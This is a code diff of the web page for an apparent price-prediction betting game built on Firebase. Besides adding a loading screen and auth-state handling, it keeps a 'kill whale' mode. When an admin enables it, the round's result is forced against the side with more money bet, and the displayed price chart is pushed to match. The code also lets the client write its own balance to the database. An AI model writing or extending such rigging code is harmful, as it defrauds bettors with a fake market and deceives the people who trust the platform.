@@ -49,9 +49,18 @@
         #toast.error i { color: #F6465D; } #toast.success i { color: #0ECB81; }
         
         .btn-loading { pointer-events: none; opacity: 0.7; }
+
+        /* LOADING SPINNER KHI CHƯA LOAD XONG DỮ LIỆU */
+        #pageLoader { position: fixed; inset: 0; background: #0b0f19; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s; }
     </style>
 </head>
 <body>
+
+    <!-- LOADING SCREEN -->
+    <div id="pageLoader">
+        <div class="w-12 h-12 rounded bg-[#FCD535] flex items-center justify-center text-black font-bold text-2xl animate-bounce rounded-bl-none">C</div>
+        <div class="text-[#6b7280] text-xs font-mono mt-4 font-bold tracking-widest">LOADING DATA...</div>
+    </div>
 
     <!-- TOAST -->
     <div id="toast"><i class="fa-solid fa-circle-check text-lg"></i><span class="text-sm font-bold text-white" id="toastMsg">...</span></div>
@@ -154,11 +163,11 @@
         </div>
     </div>
 
-    <!-- MAIN LOGIC (FULL FEATURES + KILL WHALE) -->
+    <!-- MAIN LOGIC (SỬA LỖI LOOP + AUTH REALTIME) -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, doc, updateDoc, getDoc, onSnapshot, addDoc, collection, setDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-        import { getAuth, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getAuth, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyAyYO8ZhxVvOImOZveUJULkK8tdcSxo7pU",
@@ -179,30 +188,57 @@
             history: new Array(60).fill(null), candles: [], visualPrice: CONFIG.basePrice,
             targetPrice: CONFIG.basePrice, currentPhase: 'order', lockPrice: 0,
             isProcessing: false,
+            gameStarted: false,
             // ADMIN CONFIGS
-            marketOffset: 0,
-            killWhaleMode: false,
-            totalUp: 0,
-            totalDown: 0
+            marketOffset: 0, killWhaleMode: false, totalUp: 0, totalDown: 0
         };
 
-        window.logout = () => { signOut(auth).then(() => { localStorage.removeItem('crownex_user_info'); window.location.href = "index.html"; }); };
+        window.logout = () => { 
+            signOut(auth).then(() => { 
+                localStorage.clear();
+                window.location.href = "index.html"; 
+            }); 
+        };
 
-        window.onload = async () => {
-            const userStr = localStorage.getItem('crownex_user_info');
-            if(!userStr) { window.location.href = "index.html"; return; }
-            state.userData = JSON.parse(userStr);
-            state.balance = state.userData.balance || 0;
-            document.getElementById('sidebarUsername').innerText = state.userData.fullName || state.userData.username;
-            updateBalanceUI();
-
-            if(state.userData.uid) {
-                 // Listen Balance
-                 onSnapshot(doc(db, "users", state.userData.uid), (doc) => {
-                    if(doc.exists()) { state.balance = doc.data().balance; updateBalanceUI(); }
-                });
+        // --- KHỞI TẠO LOGIC BẢO MẬT & LOAD DỮ LIỆU ---
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                // NGƯỜI DÙNG ĐÃ ĐĂNG NHẬP
+                console.log("Game Auth Check: OK");
                 
-                // Listen Global Settings (Kill Whale)
+                // 1. Thử lấy từ LocalStorage để hiển thị nhanh
+                let userStr = localStorage.getItem('crownex_user_info');
+                
+                if (userStr) {
+                    state.userData = JSON.parse(userStr);
+                    finishLoading();
+                } else {
+                    // 2. Nếu mất LocalStorage -> Tải lại từ DB
+                    try {
+                        const docSnap = await getDoc(doc(db, "users", user.uid));
+                        if(docSnap.exists()) {
+                            state.userData = docSnap.data();
+                            state.userData.uid = user.uid;
+                            localStorage.setItem('crownex_user_info', JSON.stringify(state.userData));
+                            finishLoading();
+                        } else {
+                            // Lỗi dữ liệu -> Logout
+                            window.logout();
+                        }
+                    } catch (e) {
+                        console.error(e); // Lỗi mạng -> Giữ nguyên màn hình loading hoặc retry
+                    }
+                }
+
+                // 3. Lắng nghe thay đổi số dư Realtime
+                onSnapshot(doc(db, "users", user.uid), (doc) => {
+                    if(doc.exists()) { 
+                        state.balance = doc.data().balance; 
+                        updateBalanceUI(); 
+                    }
+                });
+
+                // 4. Lắng nghe Settings Admin
                 onSnapshot(doc(db, "settings", "global"), (doc) => {
                     if(doc.exists()) {
                         const d = doc.data();
@@ -211,7 +247,6 @@
                     }
                 });
 
-                // Listen Current Game Stats (Total Bet)
                 onSnapshot(doc(db, "games", "current"), (doc) => {
                     if(doc.exists()) {
                         const d = doc.data();
@@ -219,11 +254,32 @@
                         state.totalDown = d.totalDown || 0;
                     }
                 });
-            }
-            initGame();
-            checkSavedBet();
-        };
 
+            } else {
+                // CHƯA ĐĂNG NHẬP -> VỀ INDEX
+                console.log("Game Auth Check: FAILED -> Redirect Index");
+                window.location.href = "index.html";
+            }
+        });
+
+        function finishLoading() {
+            // Tắt loading screen và hiện dữ liệu
+            document.getElementById('sidebarUsername').innerText = state.userData.fullName || state.userData.username;
+            state.balance = state.userData.balance || 0;
+            updateBalanceUI();
+            
+            const loader = document.getElementById('pageLoader');
+            loader.style.opacity = '0';
+            setTimeout(() => loader.style.display = 'none', 500);
+
+            if (!state.gameStarted) {
+                initGame();
+                checkSavedBet();
+                state.gameStarted = true;
+            }
+        }
+
+        // --- CÁC HÀM LOGIC GAME CŨ (GIỮ NGUYÊN) ---
         function checkSavedBet() {
             const saved = localStorage.getItem('crownex_active_bet');
             if (!saved) return;
@@ -325,22 +381,17 @@
             document.getElementById('confirmBar').classList.remove('slide-up'); 
             document.getElementById('confirmBar').classList.add('slide-down');
 
-            // --- CẬP NHẬT TỔNG CƯỢC HỆ THỐNG ĐỂ KILL WHALE ---
             const gameRef = doc(db, "games", "current");
             try {
-                // Update User Balance & Turnover
                 const uRef = doc(db, "users", state.userData.uid);
                 await updateDoc(uRef, { 
                     balance: state.balance,
-                    betTurnover: increment(amount), // Cộng doanh thu cược
-                    betToday: increment(amount)     // Cộng doanh thu ngày
+                    betTurnover: increment(amount),
+                    betToday: increment(amount)
                 }); 
-                
-                // Update System Total (Dùng setDoc merge để tạo nếu chưa có)
                 await setDoc(gameRef, {
                     [type === 'up' ? 'totalUp' : 'totalDown']: increment(amount)
                 }, { merge: true });
-
             } catch(e) { console.error(e); }
 
             if (!state.currentBet) { state.currentBet = { type: type, amount: amount }; } 
@@ -441,7 +492,6 @@
             document.getElementById('btnBuy').classList.remove('dimmed', 'locked'); 
             document.getElementById('btnSell').classList.remove('dimmed', 'locked');
             
-            // RESET TOTAL BETS
             if(state.userData.uid) {
                 setDoc(doc(db, "games", "current"), { totalUp: 0, totalDown: 0 });
             }
@@ -458,13 +508,11 @@
         }
 
         async function finalizeRound() {
-            // LOGIC KẾT QUẢ + BẺ CẦU (KILL WHALE)
             let res = state.visualPrice >= state.lockPrice ? 'up' : 'down';
             
-            // Nếu bật Kill Whale
             if (state.killWhaleMode) {
-                if (state.totalUp > state.totalDown) res = 'down'; // Up nhiều -> Down thắng
-                else if (state.totalDown > state.totalUp) res = 'up'; // Down nhiều -> Up thắng
+                if (state.totalUp > state.totalDown) res = 'down';
+                else if (state.totalDown > state.totalUp) res = 'up';
             }
 
             const m = new Date().getMinutes(); let pm = m - 1; if(pm < 0) pm = 59;
@@ -508,18 +556,13 @@
         }
 
         function marketLoop() {
-            // Tính toán giá (có thêm logic Admin Rigging)
             const baseNoise = Math.sin(Date.now() / 1000) * 20 + (Math.random() - 0.5) * 10;
-            // state.marketOffset được cập nhật từ Firebase (Admin chỉnh)
             state.targetPrice = CONFIG.basePrice + baseNoise + (state.marketOffset || 0);
             
-            // Logic Bẻ cầu Realtime: Ép giá đi về hướng thắng
             if (state.currentPhase === 'result' && state.killWhaleMode && state.lockPrice > 0) {
                if (state.totalUp > state.totalDown) {
-                   // Kill Up -> Price phải < Lock Price
                    if (state.targetPrice >= state.lockPrice) state.targetPrice = state.lockPrice - 15;
                } else if (state.totalDown > state.totalUp) {
-                   // Kill Down -> Price phải > Lock Price
                    if (state.targetPrice <= state.lockPrice) state.targetPrice = state.lockPrice + 15;
                }
             }
@@ -567,5 +610,4 @@
     </script>
 </body>
 </html>
-
 
